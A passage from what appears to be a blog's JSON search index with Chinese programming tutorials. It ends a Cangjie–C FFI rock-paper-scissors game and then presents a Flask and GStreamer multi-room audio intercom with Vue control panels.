初始化随机种子 initialized = 1; } return rand() % 3; // 返回0-2之间的随机整数 } 用以下代码替换main.cj文件原有代码。\npackage demo3 import std.io.* import std.console.* import std.convert.* // 声明C函数 foreign func get_computer_choice() : Int32 main(): Unit { print(\u0026#34;石头剪刀布游戏\u0026#34;) print(\u0026#34;输入数字选择: 0=石头, 1=剪刀, 2=布\u0026#34;) while (true) { print(\u0026#34;\\n你的选择(0/1/2, 输入q退出): \u0026#34;) let input = Console.stdIn.readln() if (input == \u0026#34;q\u0026#34;) { print(\u0026#34;游戏结束！\\n\u0026#34;) break } // 获取玩家输入并转为Int32类型 let player_choice = Int32.parse(input.getOrThrow()) if (player_choice \u0026lt; 0 || player_choice \u0026gt; 2) { print(\u0026#34;输入无效! 请输入0-2或q退出\u0026#34;) continue } // 调用C函数获取电脑选择 let computer_choice = unsafe {get_computer_choice()} // 判定胜负 let result = (player_choice - computer_choice + 3) % 3 var outcome = \u0026#34;\u0026#34; if (result == 0) { outcome = \u0026#34;平局！\u0026#34; } else if (result == 1) { outcome = \u0026#34;你输了！\u0026#34; } else { outcome = \u0026#34;你赢了！\u0026#34; } // 显示结果 print(\u0026#34;你：${get_name(player_choice)} | 电脑：${get_name(computer_choice)}\u0026#34;) print(outcome) print(\u0026#34;\\n-----------------------\u0026#34;) } } // 辅助函数：将数字转换为名称 func get_name(choice: Int32) : String { if (choice == 0) { return \u0026#34;石头\u0026#34; }else if (choice == 1) { return \u0026#34;剪刀\u0026#34; }else if (choice == 2) { return \u0026#34;布\u0026#34; }else { return \u0026#34;未知\u0026#34; } } 右键src目录，选择在集成终端中打开进入终端窗口，执行以下命令运行猜拳游戏。\ngcc -fPIC -shared game.c -o libgame.so cjc -L . -l game main.cj -o game_app ./game_app 至此，仓颉 - C跨语言编程实现控制台小游戏案例内容完成。\n石头剪刀布游戏输入数字选择: 0=石头, 1=剪刀, 2=布 你的选择(0/1/2, 输入q退出): 1 你：剪刀 | 电脑：剪刀平局！ ----------------------- 你的选择(0/1/2, 输入q退出): 1 你：剪刀 | 电脑：剪刀平局！ ----------------------- 你的选择(0/1/2, 输入q退出): q 游戏结束！ 资料 https://cangjie-lang.cn/\nhttps://gitcode.com/Cangjie\nhttps://developer.huawei.com/consumer/cn/training/result?orderBy=1\u0026amp;courseType=5\u0026amp;keyWord=%E4%BB%93%E9%A2%89\n","permalink":"https://qfsyso.github.io/posts/cangjie01/","summary":"仓颉-C跨语言编程 仓颉编程语言作为一款面向全场景应用开发的现代编程语言，通过现代语言特性的集成、全方位的编译优化和运行时实现、以及开箱即用的 IDE 工具链支持，为开发者打造友好开发体验和卓越程序性能。C语言是一种较早的程序设计语言，广泛应用于底层开发。C语言能以简易的方式编译、处理低级存储器。\n仓颉-C跨语言互操作介绍 仓颉为了兼容已有的生态，支持调用 C 语言的函数，也支持 C 语言调用仓颉的函数。\n仓颉支持通过FFI（Foreign Function Interface）直接调用C语言函数。其核心机制包括：\n类型兼容性：仓颉的Int32、Float64等基础类型与C语言的int、double等一一对应； 动态库绑定：将C代码编译为共享库（如.so或.dll），并通过@C和foreign声明函数； 安全性：仓颉通过类型检查确保调用参数与返回值的正确性，避免内存错误。 举个例子，假设要调用 C 的 rand 和 printf 函数，它的函数签名如下：\n// stdlib.h int rand(); // stdio.h int printf (const char *fmt, ...); 那么在仓颉中调用这两个函数的方式如下： // 通过`foreign`关键字声明函数，省略`@C` foreign func rand(): Int32 foreign func printf(fmt: CString, ...): Int32 main() { // 通过`unsafe`块调用C函数 let r = unsafe { rand() } println(\u0026#34;random number ${r}\u0026#34;) unsafe { var fmt = LibC.mallocCString(\u0026#34;Hello, No.%d\\n\u0026#34;) printf(fmt, 1) LibC.","title":"Cangjie01"},{"content":"多房间对话系统 实现多线程/多输入/多输出\n依赖 sudo apt update sudo apt install python3-pip python3-gi gstreamer1.0-tools \\ gstreamer1.0-plugins-base gstreamer1.0-plugins-good gstreamer1.0-plugins-bad \\ alsa-utils # 新建环境 python3 -m venv myenv # 激活 source myenv/bin/activate pip3 install flask gi err sudo apt update sudo apt install python3-gi python3-gi-cairo gir1.2-gstreamer-1.0 gir1.2-gst-plugins-base-1.0 sudo apt update sudo apt install gstreamer1.0-tools gstreamer1.0-plugins-base \\ gstreamer1.0-plugins-good gstreamer1.0-plugins-bad \\ python3-gi gir1.2-gst-plugins-base-1.0 sudo apt install \\ gstreamer1.0-plugins-base \\ gstreamer1.0-plugins-good \\ gstreamer1.0-plugins-bad \\ gstreamer1.0-plugins-ugly \\ gstreamer1.0-alsa \\ gstreamer1.0-tools # 删环境 rm -rf myenv # 重新建 python3 -m venv myenv --system-site-packages # 激活 source myenv/bin/activate 编码 # task_manager.py import threading import gi gi.require_version(\u0026#39;Gst\u0026#39;, \u0026#39;1.0\u0026#39;) from gi.repository import Gst Gst.init(None) class TalkSession(threading.Thread): def __init__(self, input_dev, output_dev): super().__init__() self.input_dev = input_dev self.output_dev = output_dev self.pipeline = None self.running = False def run(self): self.pipeline = Gst.parse_launch( f\u0026#34;alsasrc device={self.input_dev} ! audioconvert ! audioresample ! alsasink device={self.output_dev}\u0026#34; ) self.pipeline.set_state(Gst.State.PLAYING) self.running = True bus = self.pipeline.get_bus() while self.running: msg = bus.timed_pop_filtered(100 * Gst.MSECOND, Gst.MessageType.ERROR | Gst.MessageType.EOS) if msg: break def stop(self): self.running = False if self.pipeline: self.pipeline.set_state(Gst.State.NULL) class TalkManager: def __init__(self): self.sessions = {} def start_talk(self, from_dev, to_dev): key = f\u0026#34;{from_dev}-\u0026gt;{to_dev}\u0026#34; if key not in self.sessions: session = TalkSession(from_dev, to_dev) self.sessions[key] = session session.start() return True return False def stop_talk(self, from_dev, to_dev): key = f\u0026#34;{from_dev}-\u0026gt;{to_dev}\u0026#34; if key in self.sessions: self.sessions[key].stop() self.sessions[key].join() del self.sessions[key] return True return False def list_sessions(self): return list(self.sessions.keys()) # app.py from flask import Flask, jsonify, request, send_from_directory, render_template import subprocess from talk_manager import TalkManager app = Flask(__name__, static_folder=\u0026#39;templates\u0026#39;, static_url_path=\u0026#39;\u0026#39;) manager = TalkManager() def get_audio_devices(): result = subprocess.run([\u0026#39;arecord\u0026#39;, \u0026#39;-l\u0026#39;], stdout=subprocess.PIPE) inputs = [] for line in result.stdout.decode().split(\u0026#39;\\n\u0026#39;): if \u0026#39;card\u0026#39; in line: parts = line.strip().split() card = parts[1].replace(\u0026#39;:\u0026#39;, \u0026#39;\u0026#39;) device = parts[3].replace(\u0026#39;:\u0026#39;, \u0026#39;\u0026#39;) hw_name = f\u0026#39;hw:{card},{device}\u0026#39; inputs.append(hw_name) return inputs @app.route(\u0026#39;/\u0026#39;) def index(): return send_from_directory(\u0026#39;templates\u0026#39;, \u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/api/devices\u0026#39;) def list_devices(): devices = get_audio_devices() return jsonify({\u0026#39;devices\u0026#39;: devices}) @app.route(\u0026#39;/api/start\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def start_talk(): data = request.json from_dev = data[\u0026#39;from\u0026#39;] to_dev = data[\u0026#39;to\u0026#39;] success = manager.start_talk(from_dev, to_dev) return jsonify({\u0026#39;success\u0026#39;: success}) @app.route(\u0026#39;/api/stop\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def stop_talk(): data = request.json from_dev = data[\u0026#39;from\u0026#39;] to_dev = data[\u0026#39;to\u0026#39;] success = manager.stop_talk(from_dev, to_dev) return jsonify({\u0026#39;success\u0026#39;: success}) @app.route(\u0026#39;/api/sessions\u0026#39;) def list_sessions(): return jsonify({\u0026#39;sessions\u0026#39;: manager.list_sessions()}) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000) \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;房间对讲控制面板\u0026lt;/title\u0026gt; \u0026lt;script src=\u0026#34;https://unpkg.com/vue@3\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;房间对讲管理\u0026lt;/h1\u0026gt; \u0026lt;div\u0026gt; \u0026lt;label\u0026gt;输入设备:\u0026lt;/label\u0026gt; \u0026lt;select v-model=\u0026#34;from\u0026#34;\u0026gt; \u0026lt;option v-for=\u0026#34;dev in devices\u0026#34; :key=\u0026#34;dev\u0026#34; :value=\u0026#34;dev\u0026#34;\u0026gt;{{ dev }}\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;label\u0026gt;输出设备:\u0026lt;/label\u0026gt; \u0026lt;select v-model=\u0026#34;to\u0026#34;\u0026gt; \u0026lt;option v-for=\u0026#34;dev in devices\u0026#34; :key=\u0026#34;dev\u0026#34; :value=\u0026#34;dev\u0026#34;\u0026gt;{{ dev }}\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;button @click=\u0026#34;startTalk\u0026#34;\u0026gt;开始对讲\u0026lt;/button\u0026gt; \u0026lt;button @click=\u0026#34;stopTalk\u0026#34;\u0026gt;停止对讲\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;h2\u0026gt;当前会话:\u0026lt;/h2\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li v-for=\u0026#34;s in sessions\u0026#34; :key=\u0026#34;s\u0026#34;\u0026gt;{{ s }}\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; const { createApp } = Vue createApp({ data() { return { devices: [], from: \u0026#39;\u0026#39;, to: \u0026#39;\u0026#39;, sessions: [] } }, mounted() { this.loadDevices() this.loadSessions() }, methods: { async loadDevices() { const res = await fetch(\u0026#39;/api/devices\u0026#39;) const data = await res.json() this.devices = data.devices this.from = this.devices[0] this.to = this.devices[1] || \u0026#39;\u0026#39; }, async loadSessions() { const res = await fetch(\u0026#39;/api/sessions\u0026#39;) const data = await res.json() this.sessions = data.sessions }, async startTalk() { await fetch(\u0026#39;/api/start\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; }, body: JSON.stringify({ from: this.from, to: this.to }) }) this.loadSessions() }, async stopTalk() { await fetch(\u0026#39;/api/stop\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; }, body: JSON.stringify({ from: this.from, to: this.to }) }) this.loadSessions() } } }).mount(\u0026#39;#app\u0026#39;) \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 音量选择 # talk_manager.py import subprocess import re import gi import threading gi.require_version(\u0026#39;Gst\u0026#39;, \u0026#39;1.0\u0026#39;) from gi.repository import Gst, GLib Gst.init(None) def list_alsa_devices(device_type=\u0026#39;playback\u0026#39;): cmd = [\u0026#39;aplay\u0026#39;, \u0026#39;-l\u0026#39;] if device_type == \u0026#39;playback\u0026#39; else [\u0026#39;arecord\u0026#39;, \u0026#39;-l\u0026#39;] try: result = subprocess.run(cmd, capture_output=True, text=True, check=True) output = result.stdout except Exception as e: print(f\u0026#34;Error listing ALSA devices: {e}\u0026#34;) return [] devices = [] regex = re.compile(r\u0026#34;card (\\d+): ([^\\[]+)\\[.*?\\], device (\\d+): ([^\\[]+)\\[.*?\\]\u0026#34;) for line in output.splitlines(): m = regex.search(line) if m: card = int(m.group(1)) card_name = m.group(2).strip() device = int(m.group(3)) device_name = m.group(4).strip() devices.append((card, device, f\u0026#34;{card_name} {device_name}\u0026#34;)) return devices class TalkManager(threading.Thread): def __init__(self, input_dev=None, output_dev=None, broadcast_dev=None, input_volume=1.0, output_volume=1.0, broadcast_volume=1.0): super().__init__() self.loop = GLib.MainLoop() self.pipeline = None self.running = False self.input_devices = list_alsa_devices(\u0026#39;capture\u0026#39;) self.output_devices = list_alsa_devices(\u0026#39;playback\u0026#39;) if not self.input_devices or not self.output_devices: raise RuntimeError(\u0026#34;找不到录音或播放设备\u0026#34;) self.input_device = input_dev or self.input_devices[0] self.output_device = output_dev or self.output_devices[0] self.broadcast_device = broadcast_dev or self.output_devices[0] self.input_volume = input_volume self.output_volume = output_volume self.broadcast_volume = broadcast_volume def run(self): self.running = True in_dev_str = f\u0026#34;hw:{self.input_device[0]},{self.input_device[1]}\u0026#34; out_dev_str = f\u0026#34;hw:{self.output_device[0]},{self.output_device[1]}\u0026#34; bc_dev_str = f\u0026#34;hw:{self.broadcast_device[0]},{self.broadcast_device[1]}\u0026#34; pipeline_str = ( f\u0026#34;alsasrc device={in_dev_str} ! volume volume={self.input_volume} ! audioconvert ! audioresample ! tee name=t \u0026#34; f\u0026#34;t. ! queue ! volume volume={self.output_volume} ! audioconvert ! audioresample ! alsasink device={out_dev_str} \u0026#34; f\u0026#34;t. ! queue ! volume volume={self.broadcast_volume} ! audioconvert ! audioresample ! alsasink device={bc_dev_str}\u0026#34; ) print(f\u0026#34;启动管道: {pipeline_str}\u0026#34;) self.pipeline = Gst.parse_launch(pipeline_str) self.pipeline.set_state(Gst.State.PLAYING) try: self.loop.run() except Exception as e: print(\u0026#34;GStreamer loop exited:\u0026#34;, e) finally: self.pipeline.set_state(Gst.State.NULL) self.running = False def stop(self): if self.running: self.loop.quit() self.join() self.running = False # app.py from flask import Flask, jsonify, request from talk_manager import TalkManager, list_alsa_devices import threading app = Flask(__name__, static_folder=\u0026#39;frontend\u0026#39;, static_url_path=\u0026#39;/\u0026#39;) talk_manager = None tm_lock = threading.Lock() @app.route(\u0026#39;/\u0026#39;) def index(): return app.send_static_file(\u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/api/devices\u0026#39;) def api_devices(): inputs = list_alsa_devices(\u0026#39;capture\u0026#39;) outputs = list_alsa_devices(\u0026#39;playback\u0026#39;) return jsonify({ \u0026#39;inputs\u0026#39;: [{\u0026#39;card\u0026#39;: c, \u0026#39;device\u0026#39;: d, \u0026#39;name\u0026#39;: n} for c,d,n in inputs], \u0026#39;outputs\u0026#39;: [{\u0026#39;card\u0026#39;: c, \u0026#39;device\u0026#39;: d, \u0026#39;name\u0026#39;: n} for c,d,n in outputs], }) @app.route(\u0026#39;/api/start\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def api_start(): global talk_manager data = request.json input_dev = data.get(\u0026#39;input\u0026#39;) # {\u0026#34;card\u0026#34;:1,\u0026#34;device\u0026#34;:0} output_dev = data.get(\u0026#39;output\u0026#39;) broadcast_dev = data.get(\u0026#39;broadcast\u0026#39;) input_volume = float(data.get(\u0026#39;input_volume\u0026#39;, 1.0)) output_volume = float(data.get(\u0026#39;output_volume\u0026#39;, 1.0)) broadcast_volume = float(data.get(\u0026#39;broadcast_volume\u0026#39;, 1.0)) with tm_lock: if talk_manager and talk_manager.running: return jsonify({\u0026#39;status\u0026#39;: \u0026#39;already running\u0026#39;}) in_dev = (input_dev[\u0026#39;card\u0026#39;], input_dev[\u0026#39;device\u0026#39;]) if input_dev else None out_dev = (output_dev[\u0026#39;card\u0026#39;], output_dev[\u0026#39;device\u0026#39;]) if output_dev else None bc_dev = (broadcast_dev[\u0026#39;card\u0026#39;], broadcast_dev[\u0026#39;device\u0026#39;]) if broadcast_dev else None talk_manager = TalkManager( input_dev=in_dev, output_dev=out_dev, broadcast_dev=bc_dev, input_volume=input_volume, output_volume=output_volume, broadcast_volume=broadcast_volume ) talk_manager.start() return jsonify({\u0026#39;status\u0026#39;: \u0026#39;started\u0026#39;}) @app.route(\u0026#39;/api/stop\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def api_stop(): global talk_manager with tm_lock: if talk_manager and talk_manager.running: talk_manager.stop() talk_manager = None return jsonify({\u0026#39;status\u0026#39;: \u0026#39;stopped\u0026#39;}) else: return jsonify({\u0026#39;status\u0026#39;: \u0026#39;not running\u0026#39;}) @app.route(\u0026#39;/api/status\u0026#39;) def api_status(): global talk_manager running = talk_manager.running if talk_manager else False return jsonify({\u0026#39;running\u0026#39;: running}) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000) \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;多房间对讲系统控制面板（含广播与音量调节）\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;https://unpkg.com/element-plus/dist/index.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; /\u0026gt; \u0026lt;style\u0026gt; body { padding: 20px; background: #f5f7fa; } #app { max-width: 700px; margin: auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px #ccc; } h2 { margin-bottom: 20px; } .volume-slider { width: 300px; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;多房间对讲控制面板（含广播与音量调节）\u0026lt;/h2\u0026gt; \u0026lt;el-form label-width=\u0026#34;120px\u0026#34;\u0026gt; \u0026lt;el-form-item label=\u0026#34;录音设备\u0026#34;\u0026gt; \u0026lt;el-select v-model=\u0026#34;selectedInput\u0026#34; placeholder=\u0026#34;请选择录音设备\u0026#34; filterable\u0026gt; \u0026lt;el-option v-for=\u0026#34;item in inputs\u0026#34; :key=\u0026#34;item.card + \u0026#39;-\u0026#39; + item.device\u0026#34; :label=\u0026#34;item.name + \u0026#39; (hw:\u0026#39; + item.card + \u0026#39;,\u0026#39; + item.device + \u0026#39;)\u0026#39;\u0026#34; :value=\u0026#34;{card: item.card, device: item.device}\u0026#34;\u0026gt; \u0026lt;/el-option\u0026gt; \u0026lt;/el-select\u0026gt; \u0026lt;/el-form-item\u0026gt; \u0026lt;el-form-item label=\u0026#34;播放设备\u0026#34;\u0026gt; \u0026lt;el-select v-model=\u0026#34;selectedOutput\u0026#34; placeholder=\u0026#34;请选择播放设备\u0026#34; filterable\u0026gt; \u0026lt;el-option v-for=\u0026#34;item in outputs\u0026#34; :key=\u0026#34;item.card + \u0026#39;-\u0026#39; + item.device\u0026#34; :label=\u0026#34;item.name + \u0026#39; (hw:\u0026#39; + item.card + \u0026#39;,\u0026#39; + item.device + \u0026#39;)\u0026#39;\u0026#34; :value=\u0026#34;{card: item.card, device: item.device}\u0026#34;\u0026gt; \u0026lt;/el-option\u0026gt; \u0026lt;/el-select\u0026gt; \u0026lt;/el-form-item\u0026gt; \u0026lt;el-form-item label=\u0026#34;广播设备\u0026#34;\u0026gt; \u0026lt;el-select v-model=\u0026#34;selectedBroadcast\u0026#34; placeholder=\u0026#34;请选择广播设备\u0026#34; filterable\u0026gt; \u0026lt;el-option v-for=\u0026#34;item in outputs\u0026#34; :key=\u0026#34;item.card + \u0026#39;-\u0026#39; + item.device\u0026#34; :label=\u0026#34;item.name + \u0026#39; (hw:\u0026#39; + item.card + \u0026#39;,\u0026#39; + item.device + \u0026#39;)\u0026#39;\u0026#34; :value=\u0026#34;{card: item.card, device: item.device}\u0026#34;\u0026gt; \u0026lt;/el-option\u0026gt; \u0026lt;/el-select\u0026gt; \u0026lt;/el-form-item\u0026gt; \u0026lt;el-form-item label=\u0026#34;输入音量\u0026#34;\u0026gt; \u0026lt;el-slider v-model=\u0026#34;inputVolume\u0026#34; :min=\u0026#34;0\u0026#34; :max=\u0026#34;2\u0026#34; :step=\u0026#34;0.01\u0026#34; class=\u0026#34;volume-slider\u0026#34; show-tooltip format-tooltip=\u0026#34;val =\u0026gt; (val*100).toFixed(0) + \u0026#39;%\u0026#39;\u0026#34;\u0026gt; \u0026lt;/el-slider\u0026gt; \u0026lt;/el-form-item\u0026gt; \u0026lt;el-form-item label=\u0026#34;播放音量\u0026#34;\u0026gt; \u0026lt;el-slider v-model=\u0026#34;outputVolume\u0026#34; :min=\u0026#34;0\u0026#34; :max=\u0026#34;2\u0026#34; :step=\u0026#34;0.01\u0026#34; class=\u0026#34;volume-slider\u0026#34; show-tooltip format-tooltip=\u0026#34;val =\u0026gt; (val*100).toFixed(0) + \u0026#39;%\u0026#39;\u0026#34;\u0026gt; \u0026lt;/el-slider\u0026gt; \u0026lt;/el-form-item\u0026gt; \u0026lt;el-form-item label=\u0026#34;广播音量\u0026#34;\u0026gt; \u0026lt;el-slider v-model=\u0026#34;broadcastVolume\u0026#34; :min=\u0026#34;0\u0026#34; :max=\u0026#34;2\u0026#34; :step=\u0026#34;0.01\u0026#34; class=\u0026#34;volume-slider\u0026#34; show-tooltip format-tooltip=\u0026#34;val =\u0026gt; (val*100).toFixed(0) + \u0026#39;%\u0026#39;\u0026#34;\u0026gt; \u0026lt;/el-slider\u0026gt; \u0026lt;/el-form-item\u0026gt; \u0026lt;el-form-item\u0026gt; \u0026lt;el-button type=\u0026#34;primary\u0026#34; @click=\u0026#34;startTalk\u0026#34; :disabled=\u0026#34;running\u0026#34;\u0026gt;开始\u0026lt;/el-button\u0026gt; \u0026lt;el-button @click=\u0026#34;stopTalk\u0026#34; :disabled=\u0026#34;!running\u0026#34;\u0026gt;停止\u0026lt;/el-button\u0026gt; \u0026lt;/el-form-item\u0026gt; \u0026lt;/el-form\u0026gt; \u0026lt;div v-if=\u0026#34;running\u0026#34; style=\u0026#34;color: green; margin-top: 20px;\u0026#34;\u0026gt;正在对讲和广播中...\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;https://unpkg.com/vue@3/dist/vue.global.prod.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://unpkg.com/element-plus\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; const { createApp } = Vue const { ElMessage } = ElementPlus createApp({ data() { return { inputs: [], outputs: [], selectedInput: null, selectedOutput: null, selectedBroadcast: null, inputVolume: 1.0, outputVolume: 1.0, broadcastVolume: 1.0, running: false, } }, mounted() { this.loadDevices() this.checkStatus() }, methods: { async loadDevices() { try { let res = await fetch(\u0026#39;/api/devices\u0026#39;) let data = await res.json() this.inputs = data.inputs this.outputs = data.outputs if(this.inputs.length \u0026gt; 0) this.selectedInput = {card: this.inputs[0].card, device: this.inputs[0].device} if(this.outputs.length \u0026gt; 0) { this.selectedOutput = {card: this.outputs[0].card, device: this.outputs[0].device} this.selectedBroadcast = {card: this.outputs[0].card, device: this.outputs[0].device} } } catch(e) { ElMessage.error(\u0026#34;获取设备失败: \u0026#34; + e) } }, async startTalk() { if (!this.selectedInput || !this.selectedOutput || !this.selectedBroadcast) { ElMessage.warning(\u0026#34;请先选择所有设备\u0026#34;) return } try { let res = await fetch(\u0026#39;/api/start\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: {\u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;}, body: JSON.stringify({ input: this.selectedInput, output: this.selectedOutput, broadcast: this.selectedBroadcast, input_volume: this.inputVolume, output_volume: this.outputVolume, broadcast_volume: this.broadcastVolume }) }) let data = await res.json() if(data.status === \u0026#39;started\u0026#39; || data.status === \u0026#39;already running\u0026#39;) { this.running = true ElMessage.success(\u0026#34;开始对讲和广播\u0026#34;) } else { ElMessage.error(\u0026#34;启动失败\u0026#34;) } } catch(e) { ElMessage.error(\u0026#34;启动失败: \u0026#34; + e) } }, async stopTalk() { try { let res = await fetch(\u0026#39;/api/stop\u0026#39;, {method:\u0026#39;POST\u0026#39;}) let data = await res.json() if(data.status === \u0026#39;stopped\u0026#39;) { this.running = false ElMessage.success(\u0026#34;已停止\u0026#34;) } else { ElMessage.warning(\u0026#34;停止失败或未运行\u0026#34;) } } catch(e) { ElMessage.error(\u0026#34;停止失败: \u0026#34; + e) } }, async checkStatus() { try { let res = await fetch(\u0026#39;/api/status\u0026#39;) let data = await res.json() this.running = data.running } catch {} } } }).use(ElementPlus).mount(\u0026#39;#app\u0026#39;) \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 一对一讲话 一对多广播 from flask import Flask, jsonify, request import subprocess import re import threading import gi gi.require_version(\u0026#39;Gst\u0026#39;, \u0026#39;1.0\u0026#39;) from gi.repository import Gst, GLib Gst.init(None) app = Flask(__name__, static_folder=\u0026#39;frontend\u0026#39;, static_url_path=\u0026#39;/\u0026#39;) def list_alsa_devices(device_type=\u0026#39;playback\u0026#39;): cmd = [\u0026#39;aplay\u0026#39;, \u0026#39;-l\u0026#39;] if device_type == \u0026#39;playback\u0026#39; else [\u0026#39;arecord\u0026#39;, \u0026#39;-l\u0026#39;] try: result = subprocess.run(cmd, capture_output=True, text=True, check=True) output = result.stdout except Exception as e: print(f\u0026#34;Error listing ALSA devices: {e}\u0026#34;) return [] devices = [] regex = re.compile(r\u0026#34;card (\\d+): ([^\\[]+)\\[.*?\\], device (\\d+): ([^\\[]+)\\[.*?\\]\u0026#34;) for line in output.splitlines(): m = regex.search(line) if m: card = int(m.group(1)) card_name = m.group(2).strip() device = int(m.group(3)) device_name = m.group(4).strip() devices.append({ \u0026#34;card\u0026#34;: card, \u0026#34;device\u0026#34;: device, \u0026#34;name\u0026#34;: f\u0026#34;{card_name} {device_name}\u0026#34; }) return devices class TalkManager(threading.Thread): def __init__(self, input_dev, output_dev, broadcast_devs, input_volume=1.0, output_volume=1.0, broadcast_volume=1.0): super().__init__() self.loop = GLib.MainLoop() self.pipeline = None self.running = False self.input_device = input_dev self.output_device = output_dev self.broadcast_devices = broadcast_devs or [] self.input_volume = input_volume self.output_volume = output_volume self.broadcast_volume = broadcast_volume def run(self): self.running = True in_dev_str = f\u0026#34;hw:{self.input_device[\u0026#39;card\u0026#39;]},{self.input_device[\u0026#39;device\u0026#39;]}\u0026#34; out_dev_str = f\u0026#34;hw:{self.output_device[\u0026#39;card\u0026#39;]},{self.output_device[\u0026#39;device\u0026#39;]}\u0026#34; pipeline_str = ( f\u0026#34;alsasrc device={in_dev_str} ! volume volume={self.input_volume} ! audioconvert ! audioresample ! tee name=t \u0026#34; f\u0026#34;t. ! queue ! volume volume={self.output_volume} ! audioconvert ! audioresample ! alsasink device={out_dev_str} \u0026#34; ) for bc_dev in self.broadcast_devices: bc_dev_str = f\u0026#34;hw:{bc_dev[\u0026#39;card\u0026#39;]},{bc_dev[\u0026#39;device\u0026#39;]}\u0026#34; pipeline_str += f\u0026#34; t. ! queue ! volume volume={self.broadcast_volume} ! audioconvert ! audioresample ! alsasink device={bc_dev_str} \u0026#34; print(f\u0026#34;启动管道: {pipeline_str}\u0026#34;) self.pipeline = Gst.parse_launch(pipeline_str) self.pipeline.set_state(Gst.State.PLAYING) try: self.loop.run() except Exception as e: print(f\u0026#34;GStreamer loop exited: {e}\u0026#34;) finally: self.pipeline.set_state(Gst.State.NULL) self.running = False def stop(self): if self.running: self.loop.quit() self.join() self.running = False talk_manager = None tm_lock = threading.Lock() @app.route(\u0026#39;/\u0026#39;) def index(): return app.send_static_file(\u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/api/devices\u0026#39;) def api_devices(): inputs = list_alsa_devices(\u0026#39;capture\u0026#39;) outputs = list_alsa_devices(\u0026#39;playback\u0026#39;) return jsonify({\u0026#39;inputs\u0026#39;: inputs, \u0026#39;outputs\u0026#39;: outputs}) @app.route(\u0026#39;/api/start\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def api_start(): global talk_manager data = request.json input_dev = data.get(\u0026#39;input\u0026#39;) output_dev = data.get(\u0026#39;output\u0026#39;) broadcast_devs = data.get(\u0026#39;broadcasts\u0026#39;, []) input_volume = float(data.get(\u0026#39;input_volume\u0026#39;, 1.0)) output_volume = float(data.get(\u0026#39;output_volume\u0026#39;, 1.0)) broadcast_volume = float(data.get(\u0026#39;broadcast_volume\u0026#39;, 1.0)) with tm_lock: if talk_manager and talk_manager.running: return jsonify({\u0026#39;status\u0026#39;: \u0026#39;already running\u0026#39;}) if not input_dev or not output_dev: return jsonify({\u0026#39;status\u0026#39;: \u0026#39;error\u0026#39;, \u0026#39;message\u0026#39;: \u0026#39;输入或输出设备未选择\u0026#39;}) talk_manager = TalkManager( input_dev=input_dev, output_dev=output_dev, broadcast_devs=broadcast_devs, input_volume=input_volume, output_volume=output_volume, broadcast_volume=broadcast_volume ) talk_manager.start() return jsonify({\u0026#39;status\u0026#39;: \u0026#39;started\u0026#39;}) @app.route(\u0026#39;/api/stop\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def api_stop(): global talk_manager with tm_lock: if talk_manager and talk_manager.running: talk_manager.stop() talk_manager = None return jsonify({\u0026#39;status\u0026#39;: \u0026#39;stopped\u0026#39;}) else: return jsonify({\u0026#39;status\u0026#39;: \u0026#39;not running\u0026#39;}) @app.route(\u0026#39;/api/status\u0026#39;) def api_status(): global talk_manager running = talk_manager.running if talk_manager else False return jsonify({\u0026#39;running\u0026#39;: running}) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000) \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;多房间对讲系统控制面板\u0026lt;/title\u0026gt; \u0026lt;link 